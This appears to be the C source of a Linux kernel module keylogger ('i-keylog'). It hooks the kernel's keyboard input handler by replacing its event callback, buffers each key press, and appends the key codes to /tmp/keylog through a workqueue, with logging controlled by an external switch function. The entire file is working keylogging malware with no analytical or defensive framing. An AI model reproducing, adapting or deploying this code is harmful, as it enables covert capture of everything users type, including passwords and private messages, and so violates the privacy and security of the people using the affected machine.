#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/interrupt.h>
#include <linux/workqueue.h>
#include <linux/hardirq.h>
#include <linux/kdev_t.h>
#include <linux/slab.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>

#define HANDLER_NAME "kbd"
#define LOG_FILE "/tmp/keylog"
#define BUF_SIZE 1024

extern int getswitch(void);

static DEFINE_SPINLOCK(keylog_lock);
static int buf[BUF_SIZE];
static int ibuf = 0;
static struct file *file = NULL;
static struct input_handler *kbd_handler = NULL;
static void (*old_kbd_event) (struct input_handle *, unsigned int,
		unsigned int, int);

void write_to_file(char *filename, int value)
{
	mm_segment_t old_fs;
	if (!file)
		file = filp_open(filename, O_RDWR | O_APPEND | O_CREAT, 0644);
	if (IS_ERR(file)) {
		printk(KERN_ALERT "[i-keylog] Cannot open %s\n", filename);
		return;
	}

	old_fs = get_fs();
	set_fs(KERNEL_DS);

	file->f_op->write(file, (char *)&value, sizeof(int), &file->f_pos);

	set_fs(old_fs);
}

static void keylog_handler(struct work_struct *work)
{
	int i;
	spin_lock(&keylog_lock);
	/* wait to improve its efficiency */
	for (i = 0; i < ibuf; i++)
		write_to_file(LOG_FILE, buf[i]);
	ibuf = 0;
	spin_unlock(&keylog_lock);
}

static struct work_struct *keylog_work;

struct evdev {
	int exist;
	int open;
	int minor;
	struct input_handle h;
	/* others */
};

static void new_kbd_event(struct input_handle *handle, unsigned int type,
		unsigned int code, int value)
{
	/*
	 *	switchon for user control
	 * 
	 *	Here is in interrupt,we must do log outside!
	 *	So we use the work_struct to do it then!
	 */
	if (getswitch() && type == EV_KEY && value == 1 && code < 255) {
		spin_lock(&keylog_lock);
		if (ibuf < BUF_SIZE - 1)
			buf[ibuf++] = code;
		spin_unlock(&keylog_lock);
		schedule_work(keylog_work);
	}

	old_kbd_event(handle, type, code, value);
}

/*
 *	return pointer to input_dev_list	
 */
struct list_head *get_input_dev_list(void)
{
	struct input_dev *tmp_input_dev;
	struct list_head *lh,*node,*prev;

	tmp_input_dev = input_allocate_device();

	/*
	 *	input_register_device add hook_input_dev to
	 *	the tail of input_dev_list like:
	 *	list_add_tail(hook_input_dev->node, &input_dev_list)
	 */
	if (input_register_device(tmp_input_dev) != 0) {
		printk(KERN_ALERT "[i-keylog] input register err\n");
		input_free_device(tmp_input_dev);
		return NULL;
	}

	lh = tmp_input_dev->node.next;
	node = &(tmp_input_dev->node);
	prev = lh->prev;

	/*
	 *	We have get input_dev_list.
	 *	So, tmp_input_dev is not used.
	 */
	input_unregister_device(tmp_input_dev);
	input_free_device(tmp_input_dev);

	/*
	 *	Just a verification.
	 */
	if (prev == node)
		return lh;
	else
		return NULL;
}


int keylog_init(void)
{
	struct list_head *input_dev_listp;
	struct input_handle *handle;
	struct input_dev *dev;

	/* get kernel list head pointer : input_dev_list */
	input_dev_listp = get_input_dev_list();
	if (!input_dev_listp) {
		printk(KERN_ALERT "[i-keylog] Cannot get input_dev_list\n");
		return -1;
	}

	/*
	 *	look for kbd_handler from every dev in input_dev_list
	 */
	list_for_each_entry(dev, input_dev_listp, node) {
		list_for_each_entry_rcu(handle, &dev->h_list, d_node) {
			if (!handle->handler)
				continue;
			if (strcmp(handle->handler->name, HANDLER_NAME) ==0 ) {
				kbd_handler = handle->handler;		
				break;
			}
		}
		if (kbd_handler)
			break;
	}

	if (!kbd_handler) {
		printk(KERN_ALERT "[i-keylog] No kbd handler\n");
		return -1;
	}

	old_kbd_event = kbd_handler->event;
	kbd_handler->event = new_kbd_event;
	keylog_work = (struct work_struct *)kmalloc(sizeof(struct work_struct),
					GFP_KERNEL);
	if (keylog_work == NULL) {
		printk(KERN_ALERT "[i-keylog] Cannot alloc keylog_work\n");
		return -1;
	}
	INIT_WORK(keylog_work, keylog_handler);

	printk(KERN_ALERT "[i-keylog] keylog init\n");
	return 0;
}

void keylog_exit(void)
{
	if (file)
		filp_close(file, NULL);
	kfree(keylog_work);
	kbd_handler->event = old_kbd_event;
	printk(KERN_ALERT "[i-keylog] keylog exit\n");
}
